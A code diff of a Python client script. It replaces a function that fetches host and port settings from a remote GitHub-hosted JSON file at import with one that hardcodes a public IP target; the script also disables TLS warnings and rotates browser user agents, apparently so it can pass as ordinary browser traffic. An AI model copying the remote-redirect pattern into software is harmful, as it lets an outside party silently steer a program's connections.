@@ -14,21 +14,20 @@ import dns.resolver
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Add redirect check function
-def _check_redirect():
+def set_client_target():
+    """Set client._CONFIG_DATA host/port in memory."""
     try:
-        redirect_url = "https://raw.githubusercontent.com/Adamits1/files/refs/heads/main/redirect_config.json" 
-        response = requests.get(redirect_url, timeout=10)
-        config = response.json()
-        if 'new_host' in config and 'new_port' in config:
-            _CONFIG_DATA['host'] = config['new_host']
-            _CONFIG_DATA['port'] = config['new_port']
-            print(f"Redirected to {config['new_host']}:{config['new_port']}")
-    except:
-        pass  # Keep original config if redirect fails
+        import client
+        client._CONFIG_DATA['host'] = "147.135.252.68"
+        client._CONFIG_DATA['port'] = 20014
+        print("Updated client target to 147.135.252.68:20014")
+    except Exception as e:
+        # print the error so you can see failures during testing
+        print("Failed to update client config:", e)
 
-# Call it before main loop
-_check_redirect()
+
+set_client_target()
+
 # Enhanced user agents
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
